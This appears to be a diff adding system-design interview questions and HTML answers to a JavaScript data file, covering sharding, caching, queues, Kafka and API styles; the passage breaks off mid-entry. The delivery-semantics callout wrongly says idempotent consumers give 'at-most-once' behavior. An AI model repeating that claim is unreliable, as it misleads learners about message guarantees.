+a:`<p>Consistent hashing maps both <strong>nodes and keys to the same hash ring</strong>. A key is assigned to the first node encountered moving clockwise on the ring.</p>
+<p><strong>Why it matters:</strong> With traditional modular hashing (<code>key % N</code>), adding/removing a server remaps ~all keys. With consistent hashing, only <code>K/N</code> keys are remapped (where K = keys, N = nodes).</p>
+<pre>// Conceptual consistent hash ring
+Nodes on ring (hashed to positions 0–360°):
+  Node A → 30°
+  Node B → 120°
+  Node C → 250°
+
+Key "user:123" hashes to 80° → assigned to Node B (next clockwise)
+Key "user:456" hashes to 200° → assigned to Node C
+
+// Remove Node B:
+// Only keys between Node A (30°) and Node B (120°) move to Node C
+// All other keys are unaffected</pre>
+<p><strong>Virtual nodes:</strong> Each physical node maps to multiple positions on the ring (e.g. 150 virtual nodes). This distributes load more evenly and handles heterogeneous hardware.</p>
+<div class="callout info"><div class="callout-icon">📍</div><div class="callout-body"><strong>Used in:</strong> Amazon DynamoDB, Apache Cassandra, Redis Cluster, CDN cache routing, Memcached client libraries.</div></div>`},
+
+{id:'scalability',section:'Scalability',icon:'📈',level:'intermediate',
+q:'What is database sharding? What are the sharding strategies and their trade-offs?',
+a:`<p>Sharding is <strong>horizontal partitioning</strong> — splitting data across multiple database instances (shards), each owning a subset of the data.</p>
+<p><strong>Sharding strategies:</strong></p>
+<ul>
+<li><strong>Range-based</strong> — shard by value ranges (A–M → shard 1, N–Z → shard 2). Simple queries, but uneven distribution (hotspot risk).</li>
+<li><strong>Hash-based</strong> — <code>shard = hash(key) % N</code>. Even distribution, but range queries scan all shards.</li>
+<li><strong>Directory-based</strong> — lookup table maps key → shard. Most flexible, but lookup table is a SPOF and bottleneck.</li>
+<li><strong>Geographic</strong> — data lives in region closest to users. Latency + compliance (GDPR).</li>
+</ul>
+<div class="arch-box">
+  <div class="arch-title">Sharded Architecture</div>
+  <div class="arch-row"><span class="arch-node primary">App Server</span><span class="arch-arrow">→</span><span class="arch-node warn">Shard Router</span></div>
+  <div class="arch-row" style="margin-top:8px">
+    <span class="arch-node info">Shard 1 (userId 1–10M)</span>
+    <span style="color:var(--text3);padding:0 8px">|</span>
+    <span class="arch-node info">Shard 2 (userId 10M–20M)</span>
+    <span style="color:var(--text3);padding:0 8px">|</span>
+    <span class="arch-node info">Shard 3 (userId 20M+)</span>
+  </div>
+</div>
+<p><strong>Challenges:</strong> Cross-shard JOINs, distributed transactions, resharding is painful, hotspot if shard key is monotonic (use UUID or hash).</p>`},
+
+{id:'scalability',section:'Scalability',icon:'📈',level:'intermediate',
+q:'What is the difference between read replicas and sharding?',
+a:`<table class="comp-table">
+<tr><th></th><th>Read Replicas</th><th>Sharding</th></tr>
+<tr><td>Problem solved</td><td>Read-heavy workload</td><td>Write-heavy / data volume too large</td></tr>
+<tr><td>Data distribution</td><td>Full copy on each replica</td><td>Partitioned — each shard has a subset</td></tr>
+<tr><td>Write path</td><td>All writes go to primary only</td><td>Writes distributed across shards</td></tr>
+<tr><td>Read path</td><td>Reads from replicas (may be slightly stale)</td><td>Read from appropriate shard</td></tr>
+<tr><td>Consistency</td><td>Eventual (replication lag)</td><td>Strong within shard; eventual across</td></tr>
+<tr><td>Complexity</td><td>Low — built into most DBs</td><td>High — app must know shard routing</td></tr>
+<tr><td>Typical use</td><td>Analytics, reporting, read APIs</td><td>Multi-tenant SaaS, massive data sets</td></tr>
+</table>
+<div class="callout tip"><div class="callout-icon">💡</div><div class="callout-body"><strong>Sequence:</strong> Start with single DB → add read replicas → add caching → vertical scale primary → then consider sharding. Sharding is a last resort due to complexity.</div></div>`},
+
+{id:'scalability',section:'Scalability',icon:'📈',level:'advanced',
+q:'What is CQRS (Command Query Responsibility Segregation) and Event Sourcing?',
+a:`<p><strong>CQRS</strong> separates the write model (Commands) from the read model (Queries). They can use different datastores optimized for each use case.</p>
+<pre>// Command side — writes to normalized DB
+POST /orders { userId, items }
+→ OrderService.createOrder()
+→ Writes to PostgreSQL (normalized, ACID)
+
+// Query side — reads from denormalized read DB
+GET /orders/user/42
+→ OrderReadService.getUserOrders(42)
+→ Reads from Elasticsearch or Redis (pre-shaped for UI)</pre>
+<p><strong>Event Sourcing</strong> stores every state change as an immutable event log, instead of current state. You rebuild state by replaying events.</p>
+<pre>// Instead of storing: { balance: 500 }
+// Event store records:
+[
+  { event: "AccountOpened", amount: 1000 },
+  { event: "Withdrawn",     amount: 200 },
+  { event: "Deposited",     amount: 100 },
+  { event: "Withdrawn",     amount: 400 }
+]
+// Replay → balance = 1000 - 200 + 100 - 400 = 500</pre>
+<div class="arch-box">
+  <div class="arch-title">CQRS + Event Sourcing</div>
+  <div class="arch-row"><span class="arch-node primary">Client</span><span class="arch-arrow">→</span><span class="arch-node warn">Command Handler</span><span class="arch-arrow">→</span><span class="arch-node danger">Event Store</span></div>
+  <div class="arch-row" style="margin-top:6px"><span class="arch-node danger">Event Store</span><span class="arch-arrow">→</span><span class="arch-node info">Projector</span><span class="arch-arrow">→</span><span class="arch-node success">Read Model (Redis/ES)</span></div>
+  <div class="arch-row" style="margin-top:6px"><span class="arch-node primary">Client</span><span class="arch-arrow">→</span><span class="arch-node success">Query Handler</span><span class="arch-arrow">→</span><span class="arch-node success">Read Model</span></div>
+</div>
+<div class="callout warn"><div class="callout-icon">⚠️</div><div class="callout-body"><strong>Trade-offs:</strong> Complexity increases significantly. Eventual consistency between write and read models. Eventual queries may return stale data. Best for audit-heavy systems (banking, healthcare) or complex domain logic. Don't use for simple CRUD apps.</div></div>`},
+
+{id:'scalability',section:'Scalability',icon:'📈',level:'advanced',
+q:'What is rate limiting? How do you implement it at scale?',
+a:`<p>Rate limiting <strong>controls how many requests a client can make in a given time window</strong> to protect services from abuse and overload.</p>
+<p><strong>Common algorithms:</strong></p>
+<ul>
+<li><strong>Token Bucket</strong> — bucket holds N tokens; each request consumes 1 token; tokens refill at fixed rate. Allows bursts up to bucket size. Used by AWS API Gateway.</li>
+<li><strong>Leaky Bucket</strong> — requests enter a queue (bucket); processed at constant rate. Smooths out bursts. Good for output rate limiting.</li>
+<li><strong>Fixed Window Counter</strong> — count requests per time window (e.g. 100/min). Simple but has "double hit" problem at window edges.</li>
+<li><strong>Sliding Window Log</strong> — record timestamp of each request; count entries in past 60s. Accurate, but memory-heavy.</li>
+<li><strong>Sliding Window Counter</strong> — weighted blend of current + previous window. Best balance of accuracy and memory.</li>
+</ul>
+<pre>// Redis sliding window counter (pseudo-code)
+function isAllowed(userId, limit=100, windowSec=60):
+  key = "ratelimit:" + userId
+  now = currentTimestamp()
+  windowStart = now - windowSec
+  
+  MULTI
+    ZREMRANGEBYSCORE key 0 windowStart   // remove old entries
+    ZADD key now now                      // add current request
+    ZCARD key                             // count in window
+    EXPIRE key windowSec
+  EXEC
+  
+  count = result[2]
+  return count <= limit</pre>
+<div class="callout info"><div class="callout-icon">📍</div><div class="callout-body"><strong>Distributed rate limiting:</strong> Use Redis as a shared counter across all app servers. Each server checks Redis before processing the request. Rate limit by IP, user ID, or API key depending on context.</div></div>`},
+
+// ══════════════════════════════════════════════════════════════════
+// DATABASES
+// ══════════════════════════════════════════════════════════════════
+{id:'databases',section:'Databases',icon:'🗄️',level:'basic',
+q:'What are database indexes? How do they work and when should you use them?',
+a:`<p>An index is a <strong>separate data structure (usually a B-Tree) that stores a sorted copy of one or more columns</strong>, allowing the DB to find rows without scanning the entire table.</p>
+<pre>// Without index: Full table scan — O(n)
+SELECT * FROM users WHERE email = 'alice@example.com';
+// DB reads every row to find Alice — slow for 10M rows
+
+// With index on email column: B-Tree lookup — O(log n)
+CREATE INDEX idx_users_email ON users(email);
+// DB walks the B-Tree in ~20 steps to find Alice — fast!</pre>
+<p><strong>Types of indexes:</strong></p>
+<ul>
+<li><strong>B-Tree</strong> — default. Good for =, &lt;, &gt;, BETWEEN, ORDER BY, LIKE 'abc%'.</li>
+<li><strong>Hash</strong> — only equality (=). Faster lookup but no range queries.</li>
+<li><strong>Composite</strong> — index on (col1, col2). Useful for multi-column WHERE. Follow leftmost prefix rule.</li>
+<li><strong>Partial</strong> — index on a subset of rows (e.g. WHERE status='active'). Smaller, faster.</li>
+<li><strong>Full-text</strong> — for text search (LIKE '%word%'). Used in search engines.</li>
+</ul>
+<div class="callout warn"><div class="callout-icon">⚠️</div><div class="callout-body"><strong>Trade-off:</strong> Indexes speed up reads but slow down writes (index must be updated on every INSERT/UPDATE/DELETE). Don't index every column — index columns used in WHERE, JOIN, ORDER BY with high cardinality.</div></div>`},
+
+{id:'databases',section:'Databases',icon:'🗄️',level:'intermediate',
+q:'What is database normalization vs denormalization? When do you use each?',
+a:`<p><strong>Normalization</strong> removes data duplication by splitting data into multiple related tables. <strong>Denormalization</strong> intentionally adds redundancy to speed up reads.</p>
+<pre>// Normalized (3NF) — no duplication
+users:  { id, name, email }
+orders: { id, userId, createdAt }
+items:  { id, orderId, productId, qty }
+
+// Denormalized — pre-joined for fast reads
+orders_flat: { orderId, userId, userName, 
+               userEmail, itemCount, total }</pre>
+<table class="comp-table">
+<tr><th></th><th>Normalization</th><th>Denormalization</th></tr>
+<tr><td>Storage</td><td>Minimal — no duplication</td><td>More — data repeated</td></tr>
+<tr><td>Write speed</td><td class="yes">Fast — update in one place</td><td class="no">Slow — must update all copies</td></tr>
+<tr><td>Read speed</td><td class="no">Slower — requires JOINs</td><td class="yes">Fast — single table read</td></tr>
+<tr><td>Consistency</td><td class="yes">Easy — no anomalies</td><td class="no">Hard — can drift</td></tr>
+<tr><td>Best for</td><td>OLTP (banking, orders)</td><td>OLAP, dashboards, read-heavy APIs</td></tr>
+</table>
+<div class="callout tip"><div class="callout-icon">💡</div><div class="callout-body"><strong>Strategy:</strong> Start normalized. Denormalize specific query paths that are proven slow. Or keep normalized primary DB and maintain a denormalized read replica or cache. Never denormalize financial or user-critical data.</div></div>`},
+
+{id:'databases',section:'Databases',icon:'🗄️',level:'intermediate',
+q:'What are ACID properties? How do transactions work?',
+a:`<p>ACID is a set of properties that guarantee database transactions are processed reliably.</p>
+<ul>
+<li><strong>Atomicity</strong> — all operations in a transaction succeed, or all are rolled back. "All or nothing."</li>
+<li><strong>Consistency</strong> — transaction takes DB from one valid state to another. No constraint violations.</li>
+<li><strong>Isolation</strong> — concurrent transactions don't interfere. Levels: Read Uncommitted → Read Committed → Repeatable Read → Serializable.</li>
+<li><strong>Durability</strong> — committed transactions survive crashes (written to disk/WAL).</li>
+</ul>
+<pre>// Bank transfer — needs ACID
+BEGIN TRANSACTION;
+  UPDATE accounts SET balance = balance - 500 WHERE id = 'alice'; -- A
+  UPDATE accounts SET balance = balance + 500 WHERE id = 'bob';   -- B
+  -- If step B fails, step A is rolled back → Atomicity
+COMMIT;
+</pre>
+<div class="arch-box">
+  <div class="arch-title">Isolation Level vs Problem Prevented</div>
+  <div class="arch-row"><span class="arch-node danger">Read Uncommitted</span><span class="arch-arrow">→</span><span class="arch-node">Dirty reads possible</span></div>
+  <div class="arch-row"><span class="arch-node warn">Read Committed</span><span class="arch-arrow">→</span><span class="arch-node">No dirty reads</span></div>
+  <div class="arch-row"><span class="arch-node info">Repeatable Read</span><span class="arch-arrow">→</span><span class="arch-node">No dirty + non-repeatable reads</span></div>
+  <div class="arch-row"><span class="arch-node success">Serializable</span><span class="arch-arrow">→</span><span class="arch-node">Full isolation (slowest)</span></div>
+</div>`},
+
+{id:'databases',section:'Databases',icon:'🗄️',level:'advanced',
+q:'What is the N+1 query problem and how do you fix it?',
+a:`<p>N+1 is a performance bug where code runs <strong>1 query to fetch N records, then N more queries to fetch related data</strong> — totalling N+1 database calls.</p>
+<pre>// BAD — N+1 problem
+posts = db.query("SELECT * FROM posts LIMIT 10")   // 1 query
+for post in posts:
+    author = db.query(                              // 10 more queries!
+        "SELECT * FROM users WHERE id = ?", post.userId)
+// Result: 11 queries for 10 posts
+
+// GOOD — Eager loading with JOIN
+posts = db.query("""
+    SELECT posts.*, users.name, users.avatar 
+    FROM posts 
+    JOIN users ON posts.userId = users.id 
+    LIMIT 10
+""")                                                // 1 query — done!
+
+// ALSO GOOD — Batch fetch (IN clause)
+posts = db.query("SELECT * FROM posts LIMIT 10")
+userIds = [p.userId for p in posts]
+users = db.query("SELECT * FROM users WHERE id IN (?)", userIds)
+// 2 queries total regardless of post count</pre>
+<div class="callout warn"><div class="callout-icon">⚠️</div><div class="callout-body"><strong>Common in ORMs:</strong> Django, Rails, Hibernate all produce N+1 if you don't use eager loading. Use <code>select_related</code> (Django), <code>includes</code> (Rails), or <code>JOIN FETCH</code> (Hibernate). Always check query count in dev logs.</div></div>`},
+
+{id:'databases',section:'Databases',icon:'🗄️',level:'advanced',
+q:'What is a time-series database? When should you use one?',
+a:`<p>A time-series database (TSDB) is <strong>optimized for storing and querying data points indexed by time</strong> — metrics, logs, sensor readings, financial ticks.</p>
+<p><strong>Key optimizations TSDBs make:</strong></p>
+<ul>
+<li><strong>Write-optimized</strong> — append-only writes to time-ordered chunks; no random inserts</li>
+<li><strong>Automatic compression</strong> — delta encoding, gorilla compression on float values (10x+ compression)</li>
+<li><strong>Time-based partitioning</strong> — data chunked by time; old chunks compressed or dropped automatically</li>
+<li><strong>Built-in downsampling</strong> — auto-rollup raw data to hourly/daily aggregates</li>
+</ul>
+<pre>// PostgreSQL for metrics — slow
+SELECT avg(cpu) FROM metrics 
+WHERE host='web-01' AND time > NOW()-INTERVAL '1 hour';
+// Scans millions of rows
+
+// InfluxDB / TimescaleDB — fast
+SELECT mean(cpu) FROM metrics 
+WHERE host='web-01' AND time > now()-1h GROUP BY time(1m);
+// Hits pre-aggregated chunk — milliseconds</pre>
+<div class="callout info"><div class="callout-icon">📍</div><div class="callout-body"><strong>Popular TSDBs:</strong> InfluxDB (metrics/IoT), TimescaleDB (PostgreSQL extension), Prometheus (monitoring), Cassandra (wide-column, good for time-series at scale), ClickHouse (analytics).</div></div>`},
+
+// ══════════════════════════════════════════════════════════════════
+// CACHING
+// ══════════════════════════════════════════════════════════════════
+{id:'caching',section:'Caching',icon:'⚡',level:'basic',
+q:'What is caching? What are the different caching strategies?',
+a:`<p>Caching stores a <strong>copy of frequently-accessed data in fast storage (RAM)</strong> to avoid expensive re-computation or DB queries.</p>
+<p><strong>Cache-Aside (Lazy Loading)</strong> — most common. App checks cache first; on miss, loads from DB and stores in cache.</p>
+<pre>// Cache-Aside pattern (used by most apps)
+function getUser(userId):
+  user = cache.get("user:" + userId)     // 1. Check cache
+  if user is None:
+    user = db.query("SELECT * FROM users WHERE id=?", userId)
+    cache.set("user:" + userId, user, ttl=3600)   // 2. Warm cache
+  return user
+// First request: DB hit (slow). Subsequent: cache hit (fast).</pre>
+<p><strong>Write-Through</strong> — write to cache AND DB simultaneously. Cache always fresh, but every write is slower.</p>
+<p><strong>Write-Behind (Write-Back)</strong> — write to cache immediately, DB asynchronously later. Very fast writes, but risk of data loss on crash.</p>
+<p><strong>Read-Through</strong> — cache sits in front of DB; cache itself loads from DB on miss. App only talks to cache.</p>
+<div class="callout tip"><div class="callout-icon">💡</div><div class="callout-body"><strong>Real example:</strong> Twitter uses Cache-Aside with Redis. Your home timeline is pre-computed and stored in Redis. When you open the app, you're reading from Redis (sub-ms), not scanning the DB.</div></div>`},
+
+{id:'caching',section:'Caching',icon:'⚡',level:'intermediate',
+q:'What is cache eviction? What are the common eviction policies?',
+a:`<p>Cache eviction removes data from cache when it's full, to make room for new entries.</p>
+<ul>
+<li><strong>LRU (Least Recently Used)</strong> — evict the item that was accessed least recently. Default for most use cases. Works well when recent = relevant.</li>
+<li><strong>LFU (Least Frequently Used)</strong> — evict the item accessed fewest times. Better for stable hot data, but costly to track counts.</li>
+<li><strong>FIFO (First In, First Out)</strong> — evict oldest inserted item regardless of use. Simple but ignores access patterns.</li>
+<li><strong>TTL (Time To Live)</strong> — each entry expires after a set duration. Works well with Cache-Aside. Prevents stale data.</li>
+<li><strong>Random</strong> — evict a random entry. Surprisingly effective for uniform access patterns.</li>
+</ul>
+<pre>// LRU example — cache size = 3
+Access: A → B → C → A → D
+
+Cache state:
+After A:  [A]
+After B:  [A, B]
+After C:  [A, B, C]
+After A:  [B, C, A]  ← A moved to front (recently used)
+After D:  [C, A, D]  ← B evicted (least recently used)</pre>
+<div class="callout info"><div class="callout-icon">📍</div><div class="callout-body"><strong>Redis default:</strong> allkeys-lru (evict any key using LRU) or volatile-lru (only evict keys with TTL set). Configure via <code>maxmemory-policy</code>.</div></div>`},
+
+{id:'caching',section:'Caching',icon:'⚡',level:'intermediate',
+q:'What is a cache stampede (thundering herd) and how do you prevent it?',
+a:`<p>A cache stampede happens when a <strong>popular cache entry expires and many concurrent requests all miss the cache simultaneously</strong>, overwhelming the database.</p>
+<pre>// Problem scenario
+Cache key "homepage" expires at 12:00:00
+1000 requests arrive at 12:00:01
+  → All get cache miss
+  → All query the DB simultaneously
+  → DB collapses under load
+
+// Prevention 1: Mutex / Lock
+function getHomepage():
+  data = cache.get("homepage")
+  if data: return data
+  
+  lock = cache.acquireLock("homepage:lock", ttl=5s)
+  if lock:
+    data = db.expensiveQuery()
+    cache.set("homepage", data, ttl=300)
+    cache.releaseLock("homepage:lock")
+  else:
+    sleep(100ms)
+    return getHomepage()  // retry — lock holder will warm cache
+
+// Prevention 2: Probabilistic Early Expiry (simpler)
+// Start refreshing the cache slightly before it expires
+// based on request probability — no lock needed</pre>
+<div class="callout tip"><div class="callout-icon">💡</div><div class="callout-body"><strong>Prevention 3 — Stale-while-revalidate:</strong> Return stale (expired) data immediately while refreshing in the background. Used by CDNs and Next.js. Users get fast response, DB never gets stampeded.</div></div>`},
+
+{id:'caching',section:'Caching',icon:'⚡',level:'advanced',
+q:'What is a CDN and how does edge caching work?',
+a:`<p>A Content Delivery Network (CDN) is a <strong>globally distributed network of servers (PoPs — Points of Presence) that cache static and dynamic content close to users</strong>, reducing latency.</p>
+<div class="arch-box">
+  <div class="arch-title">CDN Request Flow</div>
+  <div class="arch-row"><span class="arch-node primary">User (Mumbai)</span><span class="arch-arrow">→</span><span class="arch-node success">CDN Edge (Singapore)</span></div>
+  <div class="arch-row" style="margin-top:6px"><span class="arch-node warn">Cache HIT</span><span class="arch-arrow">→</span><span class="arch-node">Serve from edge — ~5ms</span></div>
+  <div class="arch-row" style="margin-top:6px"><span class="arch-node danger">Cache MISS</span><span class="arch-arrow">→</span><span class="arch-node info">Origin Server (US)</span><span class="arch-arrow">→</span><span class="arch-node success">Cache at edge + serve — ~200ms</span></div>
+</div>
+<p><strong>What CDNs cache:</strong> static files (JS, CSS, images), videos (Netflix, YouTube), API responses, HTML pages (edge-side rendering).</p>
+<p><strong>Cache invalidation at CDN:</strong></p>
+<ul>
+<li><strong>TTL expiry</strong> — Cache-Control: max-age=86400. Simple, eventual.</li>
+<li><strong>Content hashing</strong> — <code>app.a3f9b2c.js</code>. Old URL never changes, new build = new URL. Zero invalidation needed.</li>
+<li><strong>API purge</strong> — CloudFront/Cloudflare allow instant cache purge by URL or tag. Used when content changes.</li>
+</ul>
+<div class="callout info"><div class="callout-icon">📍</div><div class="callout-body"><strong>Real numbers:</strong> With a CDN, 95%+ of static asset requests never reach your origin servers. A 50ms origin response becomes a 2ms edge response for cached users globally.</div></div>`},
+
+// ══════════════════════════════════════════════════════════════════
+// MESSAGING & QUEUES
+// ══════════════════════════════════════════════════════════════════
+{id:'messaging',section:'Messaging & Queues',icon:'📨',level:'intermediate',
+q:'What is a message queue? What problems does it solve?',
+a:`<p>A message queue is a <strong>buffer that decouples message producers from consumers</strong>, allowing them to operate at different speeds and independently.</p>
+<pre>// WITHOUT a queue — tight coupling
+POST /order { items }
+→ charge payment (300ms)
+→ send email (200ms)
+→ update inventory (100ms)
+→ notify warehouse (150ms)
+Total response time: 750ms. If email fails → order fails!
+
+// WITH a queue — loose coupling
+POST /order { items }
+→ charge payment (300ms)
+→ enqueue "order.created" event → respond 200 OK (fast!)
+  Workers process async:
+  → EmailWorker reads event → sends email
+  → InventoryWorker reads event → updates stock
+  → WarehouseWorker reads event → notifies WMS</pre>
+<p><strong>Problems queues solve:</strong></p>
+<ul>
+<li><strong>Speed mismatch</strong> — producer writes faster than consumer can process</li>
+<li><strong>Resilience</strong> — consumer can be down; messages wait in queue</li>
+<li><strong>Decoupling</strong> — services don't need to know about each other</li>
+<li><strong>Load leveling</strong> — absorb traffic spikes; workers process at steady rate</li>
+</ul>
+<div class="callout info"><div class="callout-icon">📍</div><div class="callout-body"><strong>Popular queues:</strong> SQS (simple, managed, at-least-once), RabbitMQ (AMQP, routing rules), Kafka (high-throughput, persistent log, replay), Celery (Python task queue).</div></div>`},
+
+{id:'messaging',section:'Messaging & Queues',icon:'📨',level:'intermediate',
+q:'What is Apache Kafka? How does it differ from traditional message queues?',
+a:`<p>Kafka is a <strong>distributed event streaming platform</strong> — a persistent, ordered, replayable log. Unlike traditional queues where messages are deleted after consumption, Kafka retains messages for a configurable retention period.</p>
+<table class="comp-table">
+<tr><th></th><th>Traditional Queue (SQS/RabbitMQ)</th><th>Kafka</th></tr>
+<tr><td>Message retention</td><td>Deleted after consumed</td><td>Retained for days/weeks</td></tr>
+<tr><td>Consumers</td><td>Competing consumers (one gets it)</td><td>Multiple independent consumer groups</td></tr>
+<tr><td>Replay</td><td class="no">Not possible</td><td class="yes">Yes — replay from any offset</td></tr>
+<tr><td>Ordering</td><td>Best-effort</td><td>Strict within partition</td></tr>
+<tr><td>Throughput</td><td>Thousands/sec</td><td>Millions/sec</td></tr>
+<tr><td>Use case</td><td>Task queues, notifications</td><td>Event sourcing, analytics, stream processing</td></tr>
+</table>
+<pre>// Kafka concepts
+Topic:     "user-events"          // channel name
+Partition: 0,1,2,...              // parallelism unit
+Offset:    0,1,2,...              // position within partition
+Producer:  → writes to topic
+Consumer:  → reads from offset (remembers position)
+
+// Multiple consumers independently read same topic
+Group A (analytics):  reads from offset 0 → real-time dashboard
+Group B (billing):    reads from offset 0 → invoice generation
+Group C (audit):      reads from offset 0 → audit log</pre>`},
+
+{id:'messaging',section:'Messaging & Queues',icon:'📨',level:'advanced',
+q:'What is exactly-once vs at-least-once delivery? How do you handle duplicate messages?',
+a:`<p>Message delivery semantics define what guarantee the system makes about how many times a message is delivered.</p>
+<ul>
+<li><strong>At-most-once</strong> — message delivered 0 or 1 times. Fast, but may lose messages. Used for metrics/logs where loss is acceptable.</li>
+<li><strong>At-least-once</strong> — message delivered 1 or more times. No loss, but duplicates possible. Most common default (SQS, Kafka default).</li>
+<li><strong>Exactly-once</strong> — message delivered exactly once. Hardest to achieve; requires coordination. Kafka 0.11+ supports it within the cluster.</li>
+</ul>
+<pre>// Handling at-least-once: make consumers IDEMPOTENT
+// Idempotent = same operation applied multiple times = same result
+
+// BAD — not idempotent
+def processPayment(event):
+    db.execute("UPDATE balance SET amount = amount - 100")
+    // If run twice → deducts $100 twice!
+
+// GOOD — idempotent with deduplication key
+def processPayment(event):
+    if db.exists("processed:" + event.id):
+        return  // already done, skip
+    db.execute("INSERT INTO processed (id) VALUES (?)", event.id)
+    db.execute("UPDATE balance SET amount = amount - 100 WHERE ...")
+    // Safe to retry — idempotency key prevents double-deduction</pre>
+<div class="callout tip"><div class="callout-icon">💡</div><div class="callout-body"><strong>Rule:</strong> Design consumers to be idempotent. Use a unique event ID or deduplication key stored in a fast store (Redis SET or DB unique index). This lets you use at-least-once delivery (simpler) while achieving at-most-once behavior in practice.</div></div>`},
+
+{id:'messaging',section:'Messaging & Queues',icon:'📨',level:'intermediate',
+q:'What is a dead letter queue (DLQ)? Why is it important?',
+a:`<p>A dead letter queue is a <strong>separate queue where messages that repeatedly fail processing are moved</strong>, preventing them from blocking the main queue.</p>
+<pre>// Without DLQ — poison message blocks the queue
+Main Queue: [msg1, msg2(bad), msg3, msg4]
+Worker processes msg2 → throws exception
+→ msg2 goes back to queue
+→ Worker processes msg2 again → fails again
+→ Infinite retry loop! msg3 and msg4 never processed
+
+// With DLQ — bad messages isolated
+Main Queue: [msg1, msg3, msg4]
+DLQ:        [msg2]  ← after 3 failed attempts, moved here
+→ Alerts team about msg2
+→ Team inspects, fixes bug, replays from DLQ</pre>
+<div class="arch-box">
+  <div class="arch-title">DLQ Flow</div>
+  <div class="arch-row"><span class="arch-node primary">Producer</span><span class="arch-arrow">→</span><span class="arch-node warn">Main Queue</span><span class="arch-arrow">→</span><span class="arch-node success">Worker</span></div>
+  <div class="arch-row" style="margin-top:6px"><span class="arch-node success">Worker fails 3x</span><span class="arch-arrow">→</span><span class="arch-node danger">DLQ</span><span class="arch-arrow">→</span><span class="arch-node info">Alert + Inspect</span></div>
+</div>
+<div class="callout tip"><div class="callout-icon">💡</div><div class="callout-body"><strong>Always configure a DLQ</strong> in production. Set maxReceiveCount = 3-5 retries before routing to DLQ. Monitor DLQ size as a health metric — non-zero means something is broken.</div></div>`},
+
+// ══════════════════════════════════════════════════════════════════
+// NETWORKING & APIs
+// ══════════════════════════════════════════════════════════════════
+{id:'networking',section:'Networking & APIs',icon:'🌐',level:'basic',
+q:'What is REST? What makes an API RESTful?',
+a:`<p>REST (Representational State Transfer) is an <strong>architectural style for designing networked APIs using HTTP</strong>. An API is RESTful when it follows these constraints:</p>
+<ul>
+<li><strong>Stateless</strong> — each request contains all needed info; server stores no session state</li>
+<li><strong>Resource-based</strong> — everything is a resource identified by a URL</li>
+<li><strong>Uniform interface</strong> — use HTTP verbs (GET, POST, PUT, DELETE, PATCH) correctly</li>
+<li><strong>Cacheable</strong> — responses labeled as cacheable or not</li>
+</ul>
+<pre>// Good RESTful API design
+GET    /users          → list users
+GET    /users/42       → get user 42
+POST   /users          → create user (body: {name, email})
+PUT    /users/42       → replace user 42 completely
+PATCH  /users/42       → partial update (body: {email})
+DELETE /users/42       → delete user 42
+
+// Nested resources
+GET    /users/42/orders      → orders of user 42
+GET    /users/42/orders/7    → specific order
+
+// BAD — verb in URL (not RESTful)
+POST /getUser      ← wrong, use GET /users/42
+POST /deleteOrder  ← wrong, use DELETE /orders/7</pre>
+<div class="callout tip"><div class="callout-icon">💡</div><div class="callout-body"><strong>HTTP status codes matter:</strong> 200 OK, 201 Created, 204 No Content, 400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found, 409 Conflict, 500 Internal Server Error. Use them correctly — don't return 200 for everything.</div></div>`},
+
+{id:'networking',section:'Networking & APIs',icon:'🌐',level:'intermediate',
+q:'What is the difference between REST, GraphQL, and gRPC? When do you use each?',
+a:`<table class="comp-table">
+<tr><th></th><th>REST</th><th>GraphQL</th><th>gRPC</th></tr>
+<tr><td>Protocol</td><td>HTTP/1.1</td><td>HTTP/1.1</td><td>HTTP/2</td></tr>
+<tr><td>Data format</td><td>JSON/XML</td><td>JSON</td><td>Protocol Buffers (binary)</td></tr>
+<tr><td>Schema</td><td>Implicit (OpenAPI docs)</td><td>Strongly typed schema</td><td>Strongly typed .proto files</td></tr>
+<tr><td>Over/under-fetch</td><td class="no">Common problem</td><td class="yes">Client requests exact fields</td><td class="yes">Defined in schema</td></tr>
+<tr><td>Performance</td><td>Good</td><td>Good</td><td class="yes">Best (binary, HTTP/2)</td></tr>
+<tr><td>Browser support</td><td class="yes">Native</td><td class="yes">Native</td><td class="no">Needs grpc-web proxy</td></tr>
+<tr><td>Best for</td><td>Public APIs, CRUD</td><td>Mobile apps, complex UI</td><td>Internal microservices</td></tr>
+</table>
+<pre>// Same data in each style:
+
+// REST — may over-fetch (gets all user fields)
+GET /users/42
+
+// GraphQL — request exactly what you need
+query { user(id: 42) { name, avatar } }
+
+// gRPC — binary, schema-defined
+rpc GetUser(UserRequest) returns (User) {}
+// ~10x smaller payload than JSON, ~3x faster serialization</pre>
+<div class="callout tip"><div class="callout-icon">💡</div><div class="callout-body"><strong>Typical setup:</strong> REST or GraphQL for client-facing APIs. gRPC for service-to-service communication internally where speed matters.</div></div>`},
+
+{id:'networking',section:'Networking & APIs',icon:'🌐',level:'intermediate',
+q:'What is WebSocket? When should you use it instead of HTTP polling?',
+a:`<p>WebSocket is a <strong>full-duplex, persistent connection</strong> over a single TCP socket. Unlike HTTP request-response, either side can send messages at any time.</p>
+<pre>// HTTP Long Polling — client keeps asking
+while true:
+  response = GET /messages/new  // wait up to 30s
+  if response.hasData:
+    display(response.data)
+// Wastes connections; 30s delay between polls
+
+// WebSocket — server pushes instantly
+ws = new WebSocket("wss://chat.example.com")
+ws.onmessage = (msg) => display(msg.data)   // instant push
+ws.send("Hello!")                            // client sends too
+// Single TCP connection; sub-millisecond delivery</pre>
+<table class="comp-table">
+<tr><th>Use case</th><th>Best choice</th><th>Why</th></tr>
+<tr><td>Chat app</td><td class="yes">WebSocket</td><td>Real-time two-way messages</td></tr>
+<tr><td>Live game state</td><td class="yes">WebSocket</td><td>10+ updates/sec, low latency</td></tr>
+<tr><td>Live dashboard</td><td class="maybe">SSE or WebSocket</td><td>Server-push, one direction</td></tr>
+<tr><td>Notifications</td><td class="maybe">SSE or polling</td><td>Infrequent, mostly server→client</td></tr>
+<tr><td>Standard API calls</td><td>HTTP REST</td><td>Stateless, easy to cache</td></tr>
+</table>`},
+
+{id:'networking',section:'Networking & APIs',icon:'🌐',level:'intermediate',
+q:'What is an API Gateway? What does it do?',
+a:`<p>An API Gateway is a <strong>single entry point for all client requests</strong> that routes them to appropriate backend services while handling cross-cutting concerns.</p>
+<div class="arch-box">
+  <div class="arch-title">API Gateway Pattern</div>
+  <div class="arch-row"><span class="arch-node primary">Mobile Client</span><span class="arch-arrow">→</span><span class="arch-node warn">API Gateway</span><span class="arch-arrow">→</span><span class="arch-node info">User Service</span></div>
